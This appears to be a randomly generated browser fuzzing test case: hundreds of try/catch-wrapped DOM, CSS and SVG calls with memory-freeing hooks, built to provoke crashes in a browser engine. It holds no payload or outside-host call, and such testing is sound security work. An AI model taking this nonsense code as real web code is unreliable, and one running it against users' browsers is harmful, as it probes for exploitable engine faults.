try { htmlvar00005.setAttribute("onblur", "eventhandler4()"); } catch(e) { }
try { htmlvar00027.src = "data:image/gif;base64,R0lGODlhIAAgAPIBAGbMzP///wAAADOZZpn/zAAAAAAAAAAAACH5BAAAAAAALAAAAAAgACAAAAOLGLrc/k7ISau9S5DNu/8fICgaYJ5oqqbDGJRrLAMtScw468J5Xr+3nm8XFM5+PGMMWYwxcMyZ40iULQaDhSzqDGBNisGyuhUDrmNb72pWcaXhtpsM/27pVi8UX96rcQpDf3V+QD12d4NKK2+Lc4qOKI2RJ5OUNHyXSDRYnZ6foKAuLxelphMQqaoPCQA7"; } catch(e) { }
try { var00058.initMouseEvent(String.fromCodePoint(542712, 967500, 596879, 388061, 520943, 67525, 331460, 463279, 1029905, 810254, 601132, 649543, 271316, 315241, 1048158, 832259, 940366, 444822, 334674, 949955),true); } catch(e) { }
try { /* newvar{var00068:long} */ var var00068 = var00065.baseOffset; } catch(e) { }
try { var00020.setProperty("-webkit-line-clamp", "0"); } catch(e) { }
try { /* newvar{var00069:long} */ var var00069 = var00064.scrollDelay; } catch(e) { }
try { htmlvar00004.deleteTFoot(); } catch(e) { }
try { document.webkitExitFullscreen(); } catch(e) { }
try { var00025.setProperty("-webkit-margin-collapse", "collapse separate"); } catch(e) { }
try { /* newvar{var00070:DOMString} */ var var00070 = htmlvar00011.computedName; } catch(e) { }
try { /* newvar{var00071:boolean} */ var var00071 = var00059.composed; } catch(e) { }
try { /* newvar{var00072:URLConstructor} */ var var00072 = window.webkitURL; } catch(e) { }
try { if (!var00072) { var00072 = GetVariable(fuzzervars, 'URLConstructor'); } else { SetVariable(var00072, 'URLConstructor');  } } catch(e) { }
try { /* newvar{var00074:IdleRequestCallback} */ var var00074 = var00010; } catch(e) { }
try { if (!var00074) { var00074 = GetVariable(fuzzervars, 'IdleRequestCallback'); } else { SetVariable(var00074, 'IdleRequestCallback');  } } catch(e) { }
try { /* newvar{var00073:long} */ var var00073 = var00001.requestIdleCallback(var00074); } catch(e) { }
try { /* newvar{var00075:ShadowRoot} */ var var00075 = svgvar00015.createShadowRoot(); } catch(e) { }
try { if (!var00075) { var00075 = GetVariable(fuzzervars, 'ShadowRoot'); } else { SetVariable(var00075, 'ShadowRoot'); SetVariable(var00075, 'DocumentOrShadowRoot'); SetVariable(var00075, 'DocumentFragment'); SetVariable(var00075, 'Element'); SetVariable(var00075, 'GlobalEventHandlers'); SetVariable(var00075, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00076:CSSRuleList} */ var var00076 = var00001.getMatchedCSSRules(htmlvar00007); } catch(e) { }
try { if (!var00076) { var00076 = GetVariable(fuzzervars, 'CSSRuleList'); } else { SetVariable(var00076, 'CSSRuleList');  } } catch(e) { }
try { /* newvar{var00079:HTMLVideoElement} */ var var00079 = document.createElement("video"); } catch(e) { }
try { if (!var00079) { var00079 = GetVariable(fuzzervars, 'HTMLVideoElement'); } else { SetVariable(var00079, 'HTMLVideoElement'); SetVariable(var00079, 'HTMLMediaElement'); SetVariable(var00079, 'Element'); SetVariable(var00079, 'GlobalEventHandlers'); SetVariable(var00079, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00078:HTMLMediaElement} */ var var00078 = var00079; } catch(e) { }
try { if (!var00078) { var00078 = GetVariable(fuzzervars, 'HTMLMediaElement'); } else { SetVariable(var00078, 'HTMLMediaElement'); SetVariable(var00078, 'Element'); SetVariable(var00078, 'GlobalEventHandlers'); SetVariable(var00078, 'EventTarget');  } } catch(e) { }
try { freememory(); } catch(e) { }
try { /* newvar{var00077:TextTrackList} */ var var00077 = var00078.textTracks; } catch(e) { }
try { if (!var00077) { var00077 = GetVariable(fuzzervars, 'TextTrackList'); } else { SetVariable(var00077, 'TextTrackList'); SetVariable(var00077, 'EventTarget');  } } catch(e) { }
try { var00077.onaddtrack = var00035; } catch(e) { }
try { document.onfullscreenerror = var00035; } catch(e) { }
try { /* newvar{var00081:MutationEvent} */ var var00081 = document.createEvent("MutationEvent"); } catch(e) { }
try { if (!var00081) { var00081 = GetVariable(fuzzervars, 'MutationEvent'); } else { SetVariable(var00081, 'MutationEvent'); SetVariable(var00081, 'Event');  } } catch(e) { }
try { /* newvar{var00080:short} */ var var00080 = var00081.attrChange; } catch(e) { }
try { svgvar00025.setAttribute("font-family", "Verdana"); } catch(e) { }
try { svgvar00005.setAttribute("lengthAdjust", "spacingAndGlyphs"); } catch(e) { }
try { /* newvar{var00082:SVGAnimatedString} */ var var00082 = svgvar00007.in1; } catch(e) { }
try { if (!var00082) { var00082 = GetVariable(fuzzervars, 'SVGAnimatedString'); } else { SetVariable(var00082, 'SVGAnimatedString');  } } catch(e) { }
try { htmlvar00034.setAttribute("ismap", "ismap"); } catch(e) { }
try { /* newvar{var00083:EventHandler} */ var var00083 = htmlvar00007.oncut; } catch(e) { }
try { if (!var00083) { var00083 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00083, 'EventHandler');  } } catch(e) { }
try { svgvar00010.setAttribute("stroke-join", "round"); } catch(e) { }
try { htmlvar00017.setAttribute("can-process-drag", "true"); } catch(e) { }
try { svgvar00017.setAttribute("k1", "13"); } catch(e) { }
try { /* newvar{var00084:TextEvent} */ var var00084 = document.createEvent("TextEvent"); } catch(e) { }
try { if (!var00084) { var00084 = GetVariable(fuzzervars, 'TextEvent'); } else { SetVariable(var00084, 'TextEvent'); SetVariable(var00084, 'UIEvent'); SetVariable(var00084, 'Event');  } } catch(e) { }
try { var00084.initTextEvent(String.fromCharCode(115, 68, 45, 32, 59, 109, 91, 109, 104, 72, 111, 72, 104, 60, 81, 87, 92, 94, 83, 36),false,true,window,"foo"); } catch(e) { }
try { var00025.setProperty("-webkit-text-fill-color", ""); } catch(e) { }
try { /* newvar{var00085:Event} */ var var00085 = document.createEvent(String.fromCodePoint(184134, 398082, 814937, 718888, 869743, 55843, 645999, 872914, 2994, 402748, 955969, 824989, 185329, 682155, 529298, 648060, 760346, 163280, 351167, 909554)); } catch(e) { }
try { if (!var00085) { var00085 = GetVariable(fuzzervars, 'Event'); } else { SetVariable(var00085, 'Event');  } } catch(e) { }
try { var00020.setProperty("-webkit-locale", "'zh_CN'"); } catch(e) { }
try { /* newvar{var00086:CSSStyleDeclaration} */ var var00086 = htmlvar00024.style; } catch(e) { }
try { if (!var00086) { var00086 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00086, 'CSSStyleDeclaration');  } } catch(e) { }
try { var00086.setProperty("-webkit-mask-repeat", "repeat-y"); } catch(e) { }
try { var00084.initTextEvent(String.fromCodePoint(943976, 378853, 1064981, 1091783, 745010, 550173, 848516, 394894, 10954, 933830, 597519, 755597, 341828, 438726, 819177, 678134, 27986, 937661, 747950, 340061),true,true,window,String.fromCharCode(78, 90, 53, 98, 49, 59, 71, 69, 90, 61, 106, 41, 85, 72, 33, 60, 116, 86, 113, 116)); } catch(e) { }
try { var00020.setProperty("-webkit-text-stroke-width", "-1px"); } catch(e) { }
try { var00025.setProperty("-ms-user-select", "none"); } catch(e) { }
try { /* newvar{var00087:EventTarget} */ var var00087 = var00047; } catch(e) { }
try { if (!var00087) { var00087 = GetVariable(fuzzervars, 'EventTarget'); } else { SetVariable(var00087, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00088:DOMString} */ var var00088 = var00005.ping; } catch(e) { }
try { var00025.setProperty("border-collapse", "collapse"); } catch(e) { }
try { /* newvar{var00089:CustomElementConstructor} */ var var00089 = document.registerElement(String.fromCharCode(77, 34, 124, 126, 93, 69, 95, 59, 49, 82, 35, 106, 49, 109, 95, 57, 66, 76, 77, 75)); } catch(e) { }
try { if (!var00089) { var00089 = GetVariable(fuzzervars, 'CustomElementConstructor'); } else { SetVariable(var00089, 'CustomElementConstructor');  } } catch(e) { }
try { /* newvar{var00090:short} */ var var00090 = htmlvar00008.compareDocumentPosition(htmlvar00037); } catch(e) { }
try { htmlvar00020.setAttribute("slope", "1"); } catch(e) { }
try { /* newvar{var00091:EventHandler} */ var var00091 = svgvar00011.onbegin; } catch(e) { }
try { if (!var00091) { var00091 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00091, 'EventHandler');  } } catch(e) { }
try { var00020.setProperty("-webkit-margin-bottom-collapse", "discard"); } catch(e) { }
try { var00053.setAttribute("transform", "matrix(2 1 90 1 00.27176624698 0)"); } catch(e) { }
try { htmlvar00002.setAttribute("itemref", "htmlvar00007"); } catch(e) { }
try { htmlvar00005.scrollIntoViewIfNeeded(); } catch(e) { }
try { freememory(); } catch(e) { }
try { htmlvar00035.setAttribute("oncanplay", "eventhandler2()"); } catch(e) { }
try { /* newvar{var00092:DOMString} */ var var00092 = htmlvar00029.content; } catch(e) { }
try { /* newvar{var00093:DOMString} */ var var00093 = var00081.newValue; } catch(e) { }
try { /* newvar{var00094:ScrollToOptions} */ var var00094 = {left: 6, top: 0}; } catch(e) { }
try { if (!var00094) { var00094 = GetVariable(fuzzervars, 'ScrollToOptions'); } else { SetVariable(var00094, 'ScrollToOptions');  } } catch(e) { }
try { htmlvar00002.scrollBy(var00094); } catch(e) { }
try { /* newvar{var00095:SVGElement} */ var var00095 = var00040.lastChild; } catch(e) { }
try { if (!var00095) { var00095 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00095, 'SVGElement'); SetVariable(var00095, 'GlobalEventHandlers'); SetVariable(var00095, 'EventTarget'); SetVariable(var00095, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00096:boolean} */ var var00096 = var00001.find("1",true); } catch(e) { }
try { /* newvar{var00097:CSSRule} */ var var00097 = var00076.item(61%var00076.length); } catch(e) { }
try { if (!var00097) { var00097 = GetVariable(fuzzervars, 'CSSRule'); } else { SetVariable(var00097, 'CSSRule');  } } catch(e) { }
try { htmlvar00036.setAttribute("aria-valuetext", "" + String.fromCharCode(95, 103, 125, 113, 44, 89, 81, 92, 84, 61, 34, 108, 103, 80, 50, 60, 83, 100, 80, 93) + ""); } catch(e) { }
try { /* newvar{var00099:HTMLSourceElement} */ var var00099 = document.createElement("source"); } catch(e) { }
try { if (!var00099) { var00099 = GetVariable(fuzzervars, 'HTMLSourceElement'); } else { SetVariable(var00099, 'HTMLSourceElement'); SetVariable(var00099, 'Element'); SetVariable(var00099, 'GlobalEventHandlers'); SetVariable(var00099, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00098:DOMString} */ var var00098 = var00099.src; } catch(e) { }
try { htmlvar00002.setAttribute("as", "media"); } catch(e) { }
try { /* newvar{var00100:DOMString} */ var var00100 = var00081.prevValue; } catch(e) { }
try { /* newvar{var00102:URL} */ var var00102 = new URL("http://foo/bar"); } catch(e) { }
try { if (!var00102) { var00102 = GetVariable(fuzzervars, 'URL'); } else { SetVariable(var00102, 'URL');  } } catch(e) { }
try { /* newvar{var00101:USVString} */ var var00101 = var00102.pathname; } catch(e) { }
try { if (!var00101) { var00101 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00101, 'USVString');  } } catch(e) { }
try { var00022.port = var00101; } catch(e) { }
try { /* newvar{var00103:long} */ var var00103 = var00054.snapshotLength; } catch(e) { }
try { var00020.setProperty("-webkit-overflow-scrolling", "touch"); } catch(e) { }
try { htmlvar00033.disabled = true; } catch(e) { }
try { htmlvar00020.inputMode = "numeric"; } catch(e) { }
try { var00025.setProperty("-webkit-column-rule-width", "4px"); } catch(e) { }
try { svgvar00027.setAttribute("glyph-orientation-horizontal", "0"); } catch(e) { }
try { var00059.initMouseEvent(String.fromCodePoint(135821, 908602, 152608, 844517, 423072, 1063892, 413130, 122186, 252973, 853146, 339109, 1019315, 489651, 857991, 372188, 1083851, 656022, 219473, 1103978, 914130),false,true,window,1,1,0,1,1,false,false,false,true,30,htmlvar00018); } catch(e) { }
try { /* newvar{var00104:HTMLCollection} */ var var00104 = document.images; } catch(e) { }
try { if (!var00104) { var00104 = GetVariable(fuzzervars, 'HTMLCollection'); } else { SetVariable(var00104, 'HTMLCollection');  } } catch(e) { }
try { /* newvar{var00105:TimeRanges} */ var var00105 = var00079.seekable; } catch(e) { }
try { if (!var00105) { var00105 = GetVariable(fuzzervars, 'TimeRanges'); } else { SetVariable(var00105, 'TimeRanges');  } } catch(e) { }
try { htmlvar00007.setAttribute("ondragstart", "eventhandler2()"); } catch(e) { }
try { /* newvar{var00106:boolean} */ var var00106 = window.find(); } catch(e) { }
try { htmlvar00017.setAttribute("span", "0"); } catch(e) { }
try { /* newvar{var00107:boolean} */ var var00107 = htmlvar00021.isConnected; } catch(e) { }
try { htmlvar00020.defaultValue = "1"; } catch(e) { }
try { /* newvar{var00108:boolean} */ var var00108 = htmlvar00025.hidden; } catch(e) { }
try { /* newvar{var00110:SVGLineElement} */ var var00110 = document.createElementNS("http://www.w3.org/2000/svg", "line"); } catch(e) { }
try { if (!var00110) { var00110 = GetVariable(fuzzervars, 'SVGLineElement'); } else { SetVariable(var00110, 'SVGLineElement'); SetVariable(var00110, 'SVGGeometryElement'); SetVariable(var00110, 'SVGGraphicsElement'); SetVariable(var00110, 'SVGElement'); SetVariable(var00110, 'GlobalEventHandlers'); SetVariable(var00110, 'EventTarget'); SetVariable(var00110, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00109:SVGAnimatedLength} */ var var00109 = var00110.y1; } catch(e) { }
try { if (!var00109) { var00109 = GetVariable(fuzzervars, 'SVGAnimatedLength'); } else { SetVariable(var00109, 'SVGAnimatedLength');  } } catch(e) { }
try { /* newvar{var00112:SVGMaskElement} */ var var00112 = document.createElementNS("http://www.w3.org/2000/svg", "mask"); } catch(e) { }
try { if (!var00112) { var00112 = GetVariable(fuzzervars, 'SVGMaskElement'); } else { SetVariable(var00112, 'SVGMaskElement'); SetVariable(var00112, 'SVGTests'); SetVariable(var00112, 'SVGElement'); SetVariable(var00112, 'GlobalEventHandlers'); SetVariable(var00112, 'EventTarget'); SetVariable(var00112, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00111:svg_url_mask} */ var var00111 = "url(#" + var00112.id + ")"; } catch(e) { }
try { if (!var00111) { var00111 = GetVariable(fuzzervars, 'svg_url_mask'); } else { SetVariable(var00111, 'svg_url_mask');  } } catch(e) { }
try { svgvar00025.setAttribute("mask", var00111); } catch(e) { }
try { var00016.scroll(); } catch(e) { }
try { /* newvar{var00114:SVGPolylineElement} */ var var00114 = document.createElementNS("http://www.w3.org/2000/svg", "polyline"); } catch(e) { }
try { if (!var00114) { var00114 = GetVariable(fuzzervars, 'SVGPolylineElement'); } else { SetVariable(var00114, 'SVGPolylineElement'); SetVariable(var00114, 'SVGGeometryElement'); SetVariable(var00114, 'SVGGraphicsElement'); SetVariable(var00114, 'SVGElement'); SetVariable(var00114, 'GlobalEventHandlers'); SetVariable(var00114, 'EventTarget'); SetVariable(var00114, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00113:SVGPointList} */ var var00113 = var00114.animatedPoints; } catch(e) { }
try { if (!var00113) { var00113 = GetVariable(fuzzervars, 'SVGPointList'); } else { SetVariable(var00113, 'SVGPointList');  } } catch(e) { }
try { var00079.setAttribute("shape", "poly"); } catch(e) { }
try { /* newvar{var00115:EventHandler} */ var var00115 = svgvar00020.onend; } catch(e) { }
try { if (!var00115) { var00115 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00115, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00116:KeyboardEvent} */ var var00116 = document.createEvent("KeyboardEvents"); } catch(e) { }
try { if (!var00116) { var00116 = GetVariable(fuzzervars, 'KeyboardEvent'); } else { SetVariable(var00116, 'KeyboardEvent'); SetVariable(var00116, 'UIEvent'); SetVariable(var00116, 'Event');  } } catch(e) { }
try { var00116.initKeyboardEvent("foo",true,false,window,"foo",-1,false,false); } catch(e) { }
try { var00025.setProperty("-webkit-color-correction", "default"); } catch(e) { }
try { svgvar00001.scrollLeft = 0.578203516007; } catch(e) { }
try { var00032.setAttribute("aria-disabled", "true"); } catch(e) { }
try { var00086.setProperty("-webkit-border-vertical-spacing", "1px"); } catch(e) { }
try { var00065.modify("move"); } catch(e) { }
try { window.webkitURL = var00072; } catch(e) { }
try { var00025.setProperty("-webkit-border-before-color", "green"); } catch(e) { }
try { /* newvar{var00117:FontFaceSet} */ var var00117 = document.fonts; } catch(e) { }
try { if (!var00117) { var00117 = GetVariable(fuzzervars, 'FontFaceSet'); } else { SetVariable(var00117, 'FontFaceSet'); SetVariable(var00117, 'EventTarget');  } } catch(e) { }
try { var00117.onloadingerror = var00091; } catch(e) { }
try { htmlvar00027.alt = "" + String.fromCharCode(37, 47, 108, 38, 99, 76, 121, 112, 109, 105, 39, 53, 46, 74, 51, 122, 116, 124, 110, 121) + ""; } catch(e) { }
try { /* newvar{var00118:htmlstring} */ var var00118 = htmlvar00015.outerHTML; } catch(e) { }
try { if (!var00118) { var00118 = GetVariable(fuzzervars, 'htmlstring'); } else { SetVariable(var00118, 'htmlstring');  } } catch(e) { }
try { htmlvar00033.outerHTML = var00118; } catch(e) { }
try { /* newvar{var00119:DOMString} */ var var00119 = htmlvar00027.alt; } catch(e) { }
try { /* newvar{var00120:DOMString} */ var var00120 = document.xmlEncoding; } catch(e) { }
try { svgvar00016.setAttribute("alt", "icon"); } catch(e) { }
try { htmlvar00004.frame = "vsides"; } catch(e) { }
try { /* newvar{var00121:float} */ var var00121 = svgvar00010.getSimpleDuration(); } catch(e) { }
try { var00064.webkitRequestFullScreen(); } catch(e) { }
try { var00020.setProperty("filter", "blur(82px) opacity(0.323622397111) hue-rotate(-1deg) sepia()"); } catch(e) { }
try { svgvar00003.setAttributeNS("http://www.w3.org/XML/1998/namespace", "xml:lang", "ro"); } catch(e) { }
try { var00036.collapse(false); } catch(e) { }
try { /* newvar{var00122:Navigator} */ var var00122 = window.navigator; } catch(e) { }
try { if (!var00122) { var00122 = GetVariable(fuzzervars, 'Navigator'); } else { SetVariable(var00122, 'Navigator'); SetVariable(var00122, 'NavigatorCPU'); SetVariable(var00122, 'NavigatorID'); SetVariable(var00122, 'NavigatorLanguage'); SetVariable(var00122, 'NavigatorOnLine'); SetVariable(var00122, 'NavigatorStorageUtils');  } } catch(e) { }
try { var00064.scrollAmount = -1; } catch(e) { }
try { var00086.setProperty("font-kerning", "auto"); } catch(e) { }
try { /* newvar{var00123:double} */ var var00123 = var00078.duration; } catch(e) { }
try { var00086.setProperty("-webkit-margin-before-collapse", "collapse"); } catch(e) { }
try { /* newvar{var00124:long} */ var var00124 = var00040.clientHeight; } catch(e) { }
try { var00020.setProperty("-webkit-border-bottom-right-radius", "1px"); } catch(e) { }
try { var00020.setProperty("visibility", "initial"); } catch(e) { }
try { /* newvar{var00125:DOMString} */ var var00125 = htmlvar00027.border; } catch(e) { }
try { /* newvar{var00126:SVGAnimatedNumber} */ var var00126 = var00040.kernelUnitLengthY; } catch(e) { }
try { if (!var00126) { var00126 = GetVariable(fuzzervars, 'SVGAnimatedNumber'); } else { SetVariable(var00126, 'SVGAnimatedNumber');  } } catch(e) { }
try { var00065.modify("extend","forward"); } catch(e) { }
try { htmlvar00024.code = "" + String.fromCharCode(67, 107, 123, 105, 68, 81, 71, 102, 35, 63, 80, 97, 58, 33, 68, 126, 39, 78, 46, 43) + ""; } catch(e) { }
try { htmlvar00010.setAttribute("aria-checked", "true"); } catch(e) { }
try { htmlvar00005.setAttribute("mayscript", "true"); } catch(e) { }
try { /* newvar{var00128:FormData} */ var var00128 = new FormData(); } catch(e) { }
try { if (!var00128) { var00128 = GetVariable(fuzzervars, 'FormData'); } else { SetVariable(var00128, 'FormData');  } } catch(e) { }
try { /* newvar{var00127:boolean} */ var var00127 = var00128.has(var00101); } catch(e) { }
try { var00110.setAttribute("primitiveUnits", "objectBoundingBox"); } catch(e) { }
try { htmlvar00025.setAttribute("row", "0"); } catch(e) { }
try { /* newvar{var00129:SVGTextContentElement} */ var var00129 = svgvar00027; } catch(e) { }
try { if (!var00129) { var00129 = GetVariable(fuzzervars, 'SVGTextContentElement'); } else { SetVariable(var00129, 'SVGTextContentElement'); SetVariable(var00129, 'SVGGraphicsElement'); SetVariable(var00129, 'SVGElement'); SetVariable(var00129, 'GlobalEventHandlers'); SetVariable(var00129, 'EventTarget'); SetVariable(var00129, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00130:MutationObserverConstructor} */ var var00130 = var00001.WebKitMutationObserver; } catch(e) { }
try { if (!var00130) { var00130 = GetVariable(fuzzervars, 'MutationObserverConstructor'); } else { SetVariable(var00130, 'MutationObserverConstructor');  } } catch(e) { }
try { var00020.setProperty("-webkit-border-vertical-spacing", "0px"); } catch(e) { }
try { /* newvar{var00131:SVGGraphicsElement} */ var var00131 = svgvar00019; } catch(e) { }
try { if (!var00131) { var00131 = GetVariable(fuzzervars, 'SVGGraphicsElement'); } else { SetVariable(var00131, 'SVGGraphicsElement'); SetVariable(var00131, 'SVGElement'); SetVariable(var00131, 'GlobalEventHandlers'); SetVariable(var00131, 'EventTarget'); SetVariable(var00131, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00132:SVGAnimatedLength} */ var var00132 = svgvar00026.x; } catch(e) { }
try { if (!var00132) { var00132 = GetVariable(fuzzervars, 'SVGAnimatedLength'); } else { SetVariable(var00132, 'SVGAnimatedLength');  } } catch(e) { }
try { htmlvar00014.setAttribute("code", "" + String.fromCharCode(121, 112, 105, 103, 95, 96, 65, 87, 83, 95, 90, 65, 47, 79, 121, 93, 53, 92, 62, 97) + ""); } catch(e) { }
try { htmlvar00024.setAttribute("archive", "" + String.fromCharCode(56, 71, 42, 102, 81, 106, 107, 99, 118, 98, 54, 92, 123, 32, 75, 67, 125, 107, 105, 42) + ""); } catch(e) { }
try { /* newvar{var00133:boolean} */ var var00133 = var00001.find("1",false,false); } catch(e) { }
try { var00059.initMouseEvent(String.fromCharCode(34, 95, 43, 33, 72, 92, 76, 37, 102, 81, 110, 112, 97, 115, 112, 54, 114, 125, 100, 40),true,false,var00001); } catch(e) { }
try { /* newvar{var00134:CSSStyleDeclaration} */ var var00134 = var00016.style; } catch(e) { }
try { if (!var00134) { var00134 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00134, 'CSSStyleDeclaration');  } } catch(e) { }
try { /* newvar{var00135:SVGAnimatedEnumeration} */ var var00135 = var00112.maskUnits; } catch(e) { }
try { if (!var00135) { var00135 = GetVariable(fuzzervars, 'SVGAnimatedEnumeration'); } else { SetVariable(var00135, 'SVGAnimatedEnumeration');  } } catch(e) { }
try { var00086.setProperty("min-zoom", "auto"); } catch(e) { }
try { /* newvar{var00136:DOMString} */ var var00136 = document.lastModified; } catch(e) { }
try { var00075.releasePointerCapture(1); } catch(e) { }
try { htmlvar00031.setAttribute("onmouseleave", "eventhandler4()"); } catch(e) { }
try { /* newvar{var00137:CSSStyleSheet} */ var var00137 = var00097.parentStyleSheet; } catch(e) { }
try { if (!var00137) { var00137 = GetVariable(fuzzervars, 'CSSStyleSheet'); } else { SetVariable(var00137, 'CSSStyleSheet'); SetVariable(var00137, 'StyleSheet');  } } catch(e) { }
try { htmlvar00029.scheme = "NIST"; } catch(e) { }
try { svgvar00004.setAttribute("to", "8 0"); } catch(e) { }
try { /* newvar{var00138:CSSStyleDeclaration} */ var var00138 = var00079.style; } catch(e) { }
try { if (!var00138) { var00138 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00138, 'CSSStyleDeclaration');  } } catch(e) { }
try { var00081.initMutationEvent("htmlvar00001"); } catch(e) { }
try { /* newvar{var00139:boolean} */ var var00139 = htmlvar00033.autofocus; } catch(e) { }
try { var00060.setAttribute("leftmargin", "10"); } catch(e) { }
try { /* newvar{var00140:EventHandler} */ var var00140 = svgvar00019.onmouseup; } catch(e) { }
try { if (!var00140) { var00140 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00140, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00141:boolean} */ var var00141 = htmlvar00025.spellcheck; } catch(e) { }
try { svgvar00010.setAttribute("font-style", "normal"); } catch(e) { }
try { svgvar00017.setAttribute("flood-opacity", "1"); } catch(e) { }
try { /* newvar{var00142:EventTarget} */ var var00142 = var00085.srcElement; } catch(e) { }
try { if (!var00142) { var00142 = GetVariable(fuzzervars, 'EventTarget'); } else { SetVariable(var00142, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00143:short} */ var var00143 = htmlvar00028.nodeType; } catch(e) { }
try { svgvar00010.onpointerdown = var00115; } catch(e) { }
try { /* newvar{var00144:EventHandler} */ var var00144 = var00112.onloadstart; } catch(e) { }
try { if (!var00144) { var00144 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00144, 'EventHandler');  } } catch(e) { }
try { svgvar00006.setAttribute("alignment-baseline", "baseline"); } catch(e) { }
try { var00131.setAttribute("seed", "0"); } catch(e) { }
try { /* newvar{var00145:DOMString} */ var var00145 = htmlvar00014.target; } catch(e) { }
try { svgvar00025.setAttribute("spreadMethod", "reflect"); } catch(e) { }
try { /* newvar{var00146:boolean} */ var var00146 = htmlvar00007.hasChildNodes(); } catch(e) { }
try { /* newvar{var00147:Navigator} */ var var00147 = var00001.navigator; } catch(e) { }
try { if (!var00147) { var00147 = GetVariable(fuzzervars, 'Navigator'); } else { SetVariable(var00147, 'Navigator'); SetVariable(var00147, 'NavigatorCPU'); SetVariable(var00147, 'NavigatorID'); SetVariable(var00147, 'NavigatorLanguage'); SetVariable(var00147, 'NavigatorOnLine'); SetVariable(var00147, 'NavigatorStorageUtils');  } } catch(e) { }
try { svgvar00027.setAttribute("keyTimes", "62;85"); } catch(e) { }
try { var00134.setProperty("column-fill", "balance"); } catch(e) { }
try { /* newvar{var00148:DOMString} */ var var00148 = document.alinkColor; } catch(e) { }
try { /* newvar{var00149:DOMString} */ var var00149 = htmlvar00014.href; } catch(e) { }
try { htmlvar00013.setAttribute("crossorigin", "crossorigin"); } catch(e) { }
try { /* newvar{var00150:EventHandler} */ var var00150 = svgvar00017.onresize; } catch(e) { }
try { if (!var00150) { var00150 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00150, 'EventHandler');  } } catch(e) { }
try { svgvar00014.onemptied = var00028; } catch(e) { }
try { /* newvar{var00151:DOMString} */ var var00151 = var00025[57%var00025.length]; } catch(e) { }
try { htmlvar00016.scrollTop = 0.361424167781; } catch(e) { }
try { /* newvar{var00153:HTMLOptGroupElement} */ var var00153 = document.createElement("optgroup"); } catch(e) { }
try { if (!var00153) { var00153 = GetVariable(fuzzervars, 'HTMLOptGroupElement'); } else { SetVariable(var00153, 'HTMLOptGroupElement'); SetVariable(var00153, 'Element'); SetVariable(var00153, 'GlobalEventHandlers'); SetVariable(var00153, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00152:boolean} */ var var00152 = var00153.disabled; } catch(e) { }
try { svgvar00021.setAttribute("version", "0"); } catch(e) { }
try { htmlvar00027.name = "" + String.fromCharCode(81, 108, 94, 86, 72, 34, 100, 88, 54, 83, 116, 55, 59, 118, 49, 101, 88, 82, 72, 51) + ""; } catch(e) { }
try { htmlvar00010.setAttribute("scrollamount", "7"); } catch(e) { }
try { /* newvar{var00154:long} */ var var00154 = var00059.movementY; } catch(e) { }
try { /* newvar{var00155:DOMString} */ var var00155 = svgvar00025.className; } catch(e) { }
try { /* newvar{var00156:boolean} */ var var00156 = var00045.pauseOnExit; } catch(e) { }
try { /* newvar{var00157:DOMString} */ var var00157 = htmlvar00024.useMap; } catch(e) { }
try { var00020.setProperty("animation-direction", "reverse"); } catch(e) { }
try { var00134.setProperty("touch-action", "pan-x pan-y"); } catch(e) { }
try { htmlvar00028.srcdoc = "x"; } catch(e) { }
try { var00025.setProperty("-webkit-overflow-scrolling", "touch"); } catch(e) { }
try { /* newvar{var00158:ProcessingInstruction} */ var var00158 = document.createProcessingInstruction("foo","foo"); } catch(e) { }
try { if (!var00158) { var00158 = GetVariable(fuzzervars, 'ProcessingInstruction'); } else { SetVariable(var00158, 'ProcessingInstruction'); SetVariable(var00158, 'CharacterData'); SetVariable(var00158, 'Element'); SetVariable(var00158, 'GlobalEventHandlers'); SetVariable(var00158, 'EventTarget');  } } catch(e) { }
try { htmlvar00034.setAttribute("high", "7"); } catch(e) { }
try { document.onpointerlockerror = var00144; } catch(e) { }
try { var00138.setProperty("mso-data-placement", "same-cell"); } catch(e) { }
try { /* newvar{var00159:double} */ var var00159 = var00059.deltaZ; } catch(e) { }
try { /* newvar{var00160:EventHandler} */ var var00160 = svgvar00003.onbeforepaste; } catch(e) { }
try { if (!var00160) { var00160 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00160, 'EventHandler');  } } catch(e) { }
try { var00086.setProperty("cursor", "auto"); } catch(e) { }
try { htmlvar00029.setAttribute("http-equiv", "X-UA-Compatible"); } catch(e) { }
try { /* newvar{var00161:Element} */ var var00161 = htmlvar00014.firstChild; } catch(e) { }
try { if (!var00161) { var00161 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00161, 'Element'); SetVariable(var00161, 'GlobalEventHandlers'); SetVariable(var00161, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00162:long} */ var var00162 = svgvar00025.scrollHeight; } catch(e) { }
try { /* newvar{var00163:EventHandler} */ var var00163 = var00001.onanimationiteration; } catch(e) { }
try { if (!var00163) { var00163 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00163, 'EventHandler');  } } catch(e) { }
try { freememory(); } catch(e) { }
try { var00065.modify("move","left","paragraph"); } catch(e) { }
try { htmlvar00015.onabort = var00083; } catch(e) { }
try { htmlvar00009.setAttribute("scoped", "scoped"); } catch(e) { }
try { var00001.scroll(); } catch(e) { }
